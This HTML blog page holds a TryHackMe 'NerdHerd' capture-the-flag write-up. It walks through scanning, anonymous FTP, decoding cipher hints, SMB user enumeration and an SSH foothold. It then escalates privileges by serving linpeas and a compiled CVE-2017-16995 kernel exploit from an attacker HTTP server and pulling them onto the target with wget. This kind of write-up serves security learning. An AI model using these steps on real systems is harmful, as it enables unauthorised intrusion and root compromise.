<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/nerdherd_writeup/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
       <meta property="og:title" content="NerdHerd_writeup" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/nerdherd_writeup/" /><meta property="article:published_time" content="2020-11-07T02:39:20-05:00" />



<meta name="twitter:title" content="NerdHerd_writeup"/>
<meta name="twitter:description" content="Have you ever been stuck in a rabbit hole for days? Welcome to NerdHerd!"/>

</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/nerdherd_writeup'>nerdherd_writeup</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>NerdHerd_writeup</h1>
Nov. 7, 2020


<br/><br/>
<img src="../img/nerdherd_cover.gif" alt="Post Cover Gif animation";>
<br/><br/>
<h1 id="nerdherd---thm-room">NerdHerd - THM Room</h1>
<p>Welcome to another writeup, this time we&rsquo;ll be trying to hack a newly released room on TryHackMe called NerdHerd, inspired by the TV series Chuck!.</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/nerdherd">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
</ul>
<h2 id="getting-initial-access">Getting initial access</h2>
<p>To start things off, Let&rsquo;s leave <code>autorecon</code> running:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.160.23
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.160.23
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.160.23
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.160.23
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Service detection nmap-top-20-udp on 10.10.160.23 returned non-zero exit code: <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.160.23 finished successfully in <span style="color:#ae81ff">44</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ftp on tcp/21 on target 10.10.160.23
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/22 on target 10.10.160.23
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/139 on target 10.10.160.23
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/139/nbtscan<span style="color:#f92672">]</span> Scan cannot be run against tcp port 139. Skipping.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/445 on target 10.10.160.23

</code></pre></div><p>We start by checking the FTP server, we see anonymous login is enabled and we can browse around to find some files. I downloaded them to my local folder:</p>
<p><img src="https://i.imgur.com/EVrh6bP.png" alt=""></p>
<p>One of the files reads <code>all you need is in the leet</code> pointing us towards the same port discovered by our scans <code>1337</code> which can be read as <code>leet</code>.</p>
<p>If we look at what is being served at port 1337 we get the default apache page with a little taunt in form of a popup.</p>
<p><img src="https://i.imgur.com/kGinlYj.png" alt=""></p>
<p><img src="https://i.imgur.com/YIuQTq4.png" alt=""></p>
<p>Also at the end of the default apache page, we see a link to a video (?)</p>
<p><img src="https://i.imgur.com/YPIclQi.png" alt=""></p>
<p>Looking around and after checking gobuster&rsquo;s results, there is an <code>/admin/</code> login form and in the HTML a possible hint:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--
</span><span style="color:#75715e">	these might help:
</span><span style="color:#75715e">		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
</span><span style="color:#75715e">--&gt;</span>
</code></pre></div><p>On further inspection of the login form. It does not seem to return any error when trying to login and just nothing happens when trying to create a new account. This seems like a decoy.</p>
<p><img src="https://i.imgur.com/ZFiHc13.png" alt=""></p>
<p>If we go back to that comment we found on the HTML, we can try to decode that and see if it reveals anything useful. We can try to use <code>cyberchef</code> to attempt to decode the data:</p>
<p><img src="https://i.imgur.com/qTBu4LZ.png" alt=""></p>
<p>That seems to have worked and we do get a username of <code>cibartowski</code>. Let&rsquo;s see if we can do the same for the other piece of data in the comment:</p>
<p><img src="https://i.imgur.com/oHD3Fi2.png" alt=""></p>
<p>I&rsquo;m not sure the last decoding worked as expected. That certainly looks like a base64 encoding. This could very well be a rabbit hole.</p>
<blockquote>
<p>That didn&rsquo;t stop me from being stuck there for a couple of days trying my best to decode/decrypt it :laughing:</p>
</blockquote>
<p>Let&rsquo;s proceed further. Before, we found an image and we didn&rsquo;t really do anything with that. Let&rsquo;s see if we can find anything on it. Let&rsquo;s run <code>exifTool</code> on it:</p>
<p><img src="https://i.imgur.com/n7B3xTJ.png" alt=""></p>
<p>If we look carefully we see that we get a file owner name of <code>fijbxslz</code>. I don&rsquo;t know about you but that looks a bit off. Let&rsquo;s see if we can find any encoding/encryption match using <code>cyberChef</code>.</p>
<p>After tinkering a bit with cyberchef I did not find any encoding that really produces back a string that could be a password/username(at lest they didn&rsquo;t look like one). I think we are missing a bit of information. I we go back to our findings we also failed to understand what information was actually trying to reveal to us that video that we found. Maybe this is in fact a cipher, and for most of those we need a <code>keyword</code> or <code>phrase</code> to decode. So, if we think about it that video could have that key. If we look the lyrics for that song:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">A-well now, everybody<span style="color:#e6db74">&#39;s heard about the bird [Repeat: x 2]
</span><span style="color:#e6db74">About the bird, the bird, bird bird bird
</span><span style="color:#e6db74">(this line is backing sung throughout the song)
</span><span style="color:#e6db74">(&#34;Tweet tweet tweet&#34; sung over backing)
</span><span style="color:#e6db74">Swingin&#39;</span> this dance now to hit the scene

...

And get to flappin<span style="color:#e6db74">&#39; your wings, in the west or the east
</span><span style="color:#e6db74">Haven&#39;</span>t you heard about the bird?
Don<span style="color:#e6db74">&#39;t you know that the bird&#39;</span>s the word?
Bird, bird, bird, bird, bird
</code></pre></div><p>Could <code>bird</code> be the word we are looking for? let&rsquo;s try it out.</p>
<p><img src="https://i.imgur.com/rzUDLzQ.png" alt=""></p>
<p>That didn&rsquo;t work. But it doesn&rsquo;t mean we are approaching this totally wrong. Let&rsquo;s see if we can tinker a bit more with the lyrics and see if we decode something that makes a bit of sense.</p>
<p><img src="https://i.imgur.com/gn9Imj8.png" alt=""></p>
<p>That took a while, after trying a lot of combinations from the lyrics. Guess what? <code>birdistheword</code>! I mean, really. That was pretty obvious, and still I struggled for a good amount of time trying out combinations of words from that lyric. We should really have to start considering <code>occam's razor</code> more often. Lesson learned.</p>
<blockquote>
<p>Occam&rsquo;s razor is the principle that, of two explanations that account for all the facts, the simpler one is more likely to be correct. It is applied to a wide range of disciplines, including religion, physics, and medicine.</p>
</blockquote>
<p><img src="https://i.imgur.com/m43Fvx9.png" alt=""></p>
<p>Anyways, after a while of playing around with Cyberchef. It turns out decoding <code>vigenère</code> with that phrase from the lyrics of the song gives us a password.</p>
<p>At this point we need to try those out, could those be for the login form we got before? I guess we have to check it to be sure. <code>cibartowski:easypass</code> there we go. I&rsquo;ll spare you the pain, that didn&rsquo;t work. That login form just doesn&rsquo;t seem to work.</p>
<p>What else we found that we could try to log into? There was an <code>FTP</code> and an <code>SSH</code>. But <code>autorecon</code> also found some <code>smb shares</code>:</p>
<p><img src="https://i.imgur.com/3dtqFQI.png" alt=""></p>
<p>Let&rsquo;s see if any of those work for us.</p>
<h3 id="ssh">SSH</h3>
<p><img src="https://i.imgur.com/edOuYAR.png" alt=""></p>
<p>That didn&rsquo;t work either.</p>
<h3 id="ftp">FTP</h3>
<p><img src="https://i.imgur.com/ufxYcE6.png" alt=""></p>
<p>Nop, that&rsquo;s another nop nope.</p>
<h3 id="smb-shares">SMB Shares</h3>
<p><img src="https://i.imgur.com/z3wEgns.png" alt=""></p>
<p>Hmm that did not work either. What if we are incorrectly assuming the username we found before is the correct one. I mean, it could very well be also part of the rabbit hole. One thing we didn&rsquo;t do either is try to enumerate the share users. Let&rsquo;s see if we can do that:</p>
<p><img src="https://i.imgur.com/dd8s114.png" alt=""></p>
<p>Ok, so the user we found before seems to be a decoy indeed to steer us away. After enumerating the users we see the username is actually <code>chuck</code>.</p>
<blockquote>
<p>NOTE: Don&rsquo;t be like me XD. If you look carefully at the results returned by autorecon which I did long AFTER doing this manually, you&rsquo;ll see that it already had returned us the username of <code>chuck</code>. So now you know, make sure to pay attention to all possible details and check you are not missing any details from the scan results.</p>
</blockquote>
<p>Let&rsquo;s see if we can actually connect to the share now (we can also see if maybe chuck is a valid user for FTP and SSH):</p>
<p><img src="https://i.imgur.com/L7GSTnH.png" alt=""></p>
<p>That worked, we are able to connect to that <code>classified</code> share now. And we can see there is a file in there. Let&rsquo;s see what it has for us:</p>
<p><img src="https://i.imgur.com/R1hjqhN.png" alt=""></p>
<p>So we get another directory to look at. Let&rsquo;s see if that&rsquo;s something we can access via browser. After all <code>leet is all you need</code>.</p>
<p><img src="https://i.imgur.com/wRIuZrX.png" alt=""></p>
<p>Indeed we can access that directory right from the browser. And it seems we have some other file there.</p>
<p>If we look at that file we get this:</p>
<p><img src="https://i.imgur.com/cS4edBA.png" alt=""></p>
<p>Ok let&rsquo;s see if now we can access that <code>ssh</code> or if this is another game from the room creator (which is awesome BTW, just like chuck!):</p>
<p><img src="https://i.imgur.com/4e5nP5C.png" alt=""></p>
<p>That works and we finally have a foothold on this machine. If we look around a bit we see the user flag right there:</p>
<p><img src="https://i.imgur.com/ma9NHVT.png" alt=""></p>
<h2 id="getting-root">Getting root</h2>
<p>Now that we have our initial access, let&rsquo;s upload linpeas.sh and see what it finds for us. For that I fire up a <code>python3 -m http.server 80</code> in a local folder where I have the script. Then we just run <code>wget http://{your_IP}/linpeas.sh</code> into a writable directory.</p>
<blockquote>
<p>Remember to <code>chmod +x linpeas.sh</code> before running it.</p>
</blockquote>
<p><img src="https://i.imgur.com/E73Uyfm.png" alt=""></p>
<p>Now we just wait for linpeas to run through and show its results back.</p>
<p>Right off the bat we get a possible PE vector:</p>
<p><img src="https://i.imgur.com/83BHqOU.png" alt=""></p>
<p>Let&rsquo;s see if we can find some exploit for that linux kernel that linpeas pointed out for us, let&rsquo;s google!</p>
<p><img src="https://i.imgur.com/BBC7TsD.png" alt=""></p>
<p>It seems we have some options, let&rsquo;s check the one mentioned in <code>exploit-db.com</code>:</p>
<p><img src="https://i.imgur.com/Uh9OOfT.png" alt=""></p>
<p>Seems to be a script in written in C language, so we&rsquo;ll need to turn it into an executable file. After googling a bit I&rsquo;ve come across this site that explains a bit on compiling C programs with <code>gcc</code>. Check that post <a href="https://www3.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html">here</a>.</p>
<p>Let&rsquo;s see an extract of that post to understand how to compile the exploit we found:</p>
<p><img src="https://i.imgur.com/HNE5u41.png" alt=""></p>
<p>Seems rather simple, let&rsquo;s compile locally and upload it to the target machine as we did with linpeas before:</p>
<p><img src="https://i.imgur.com/DoZ3mYW.png" alt=""></p>
<p>Now lets fire up a local http server again and using wget we can upload the exploit:</p>
<p><img src="https://i.imgur.com/z0HAVw2.png" alt=""></p>
<p>Now we just need to run it. Fingers crossed:</p>
<p><img src="https://i.imgur.com/0xreU9D.png" alt=""></p>
<p>Darn it! That did not work!&hellip;and it also crashed our session. We might need to try another one of the exploits returned for this vuln. Let&rsquo;s get back to google.</p>
<p>There is another script we can try located in <a href="https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c">this repo</a>. Let&rsquo;s give that one a try.</p>
<p>We repeat the same steps as before: <code>compile, upload, chmod +x, execute</code></p>
<p><img src="https://i.imgur.com/MHbJDWh.png" alt=""></p>
<p>IT WORKS!! we are root. Effing finally. Let&rsquo;s see where that damn flag is:</p>
<p>Actually before we do that let&rsquo;s get an interactive shell first, since the one we got is a pain in the a**.</p>
<p><img src="https://i.imgur.com/Pa6C2Dx.png" alt=""></p>
<p><img src="https://i.imgur.com/AGTRLsq.png" alt=""></p>
<p>So we are being trolled! that got me laughing late at night (wife&rsquo;s not happy), well played <code>0xpr0N3rd</code>.</p>
<p>Ok so now we need to locate that flag, let&rsquo;s see if <code>find</code> command helps us here. Let&rsquo;s see if <code>find</code> gives us a chance to go to sleep before sunrise XD:</p>
<p><img src="https://i.imgur.com/BYKy1vD.png" alt=""></p>
<p>That&rsquo;s it! we got the root flag, finally. But the room also contains a <code>bonus</code> flag for good measure. Let&rsquo;s see if I have any brain left to find that before I fall asleep(it&rsquo;s 3:35 AM at this point).</p>
<h2 id="getting-the-bonus-flag">Getting the bonus flag</h2>
<p>The hint for the last flag is <code>brings back so many memories</code>&hellip; Let&rsquo;s see if we can find that last flag by using <code>grep</code> command along with <code>find</code>. We&rsquo;ll try to look into files containing <code>THM</code> since that&rsquo;s probably another flag in the format of <code>THM{weird_random_values}</code>:</p>
<blockquote>
<p>You can check <a href="https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux">this</a> post to read about how to use find &amp; grep for this. Beware this will take some time since we&rsquo;ll be searching the whole machine. We should probably try to narrow down the search.</p>
</blockquote>
<p>The command looks like this: <code>find . -type f -exec grep -sH 'THM{' {} \; 2&gt;/dev/null</code></p>
<p>Spoiler: That approach is taking ages. Let&rsquo;s see if we can find the flag manually, we need to possibly look into logs or history files. If We look at the <code>.bash_history</code> we see a message there:</p>
<p><img src="https://i.imgur.com/0KpzWOU.png" alt=""></p>
<p>This guy is teasing us! could it be that we should look into another user&rsquo;s history? Let&rsquo;s see if we can find another history file. Let&rsquo;s look at our own folder <code>root</code>:</p>
<p><img src="https://i.imgur.com/AXgy6xl.png" alt=""></p>
<p>After we run our find command we get a match, then we just cat and grep that file looking for our magic string <code>THM</code> and voilá! We got the bonus flag!</p>
<p>This room really made me sweat, I was stuck on that damn rabbit hole trying to decode that <code>password</code> for days! After running out of options and even watch <code>Ciphey</code> hang trying to decode that string (The one we found in the HTML code) I got tired and started looking for other clues. And After a lot of effort and learning we were able to complete this room. Don&rsquo;t give up, just keep trying other things. And don&rsquo;t get stuck with something for days like I did. Like The Mayor says, &ldquo;sometimes try harder&rdquo; doesn&rsquo;t work and you have to find a different approach.</p>
<p>I hope you enjoy this room as I did, thanks to <code>0xpr0N3rd</code> for creating this very entertaining room. I&rsquo;m gonna publish this writeup and hit the bed. (it&rsquo;s 4:47am)</p>
<p>Happy hacking!</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>



        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> with
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
</div>

    </div>
  </body>
</html>
